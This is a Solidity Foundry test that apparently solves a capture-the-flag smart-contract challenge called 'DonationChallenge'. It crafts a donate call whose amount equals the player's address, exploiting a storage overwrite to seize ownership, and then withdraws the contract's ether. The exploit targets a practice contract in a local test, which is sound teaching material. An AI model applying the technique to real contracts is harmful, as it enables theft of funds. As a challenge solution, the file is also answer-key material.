// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "src/utils/Create.sol";

contract ExploitTest is Test {
    address playerAddr;
    IChallenge challenge;

    function setUp() public {
        playerAddr = makeAddr("player");
        challenge = IChallenge(Create.create("DonationChallenge.sol:DonationChallenge", 1 ether));
        vm.deal(playerAddr, 1 ether);
    }

    function test() public {
        vm.startPrank(playerAddr, playerAddr);

        uint256 etherAmount = uint160(playerAddr);
        uint256 scale = 10 ** 18 * 1 ether;
        uint256 value = etherAmount / scale;
        challenge.donate{value: value}(etherAmount);
        challenge.withdraw();

        vm.stopPrank();
        assertTrue(challenge.isComplete(), "Challenge is not complete");
    }
}

interface IChallenge {
    function donate(uint256 etherAmount) external payable;
    function isComplete() external view returns (bool);
    function withdraw() external;
}
